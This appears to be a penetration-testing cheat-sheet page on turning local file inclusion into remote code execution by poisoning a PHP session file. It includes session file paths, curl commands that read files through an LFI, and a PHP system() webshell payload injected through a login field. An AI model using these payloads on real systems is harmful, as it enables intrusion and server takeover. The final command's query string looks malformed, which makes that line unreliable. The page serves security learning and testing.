# PHP Sessions

## Theory

&#x20;If the website use PHP Session (PHPSESSID), we may poison cookies and include it throught LFI

## Practice

{% tabs %}
{% tab title="Enumerate" %}
First we should find where the sessions are stored, for example

```bash
# Linux
/var/lib/php5/sess_[PHPSESSID]
/var/lib/php/sessions/sess_[PHPSESSID]

# Windows 
C:\Windows\Temp\sess_[PHPSESSID]
```

Second, display a `PHPSESSID` to see if any parameter is reflected inside:

```bash
curl $URL/?file=/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```

&#x20;In this case, we can inject some PHP code in the reflected parameter in the session.
{% endtab %}

{% tab title="Exploit" %}
We can inject some PHP code in the reflected parameter in the session.

```bash
#Set cookie to <?php system($_GET['cmd']);?>
login=1&user=<?php system($_GET['cmd']);?>&pass=password&lang=en_us.php
```

Use the LFI to include the PHP session file

```bash
curl $URL/?file=/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27?cmd=id
```
{% endtab %}
{% endtabs %}
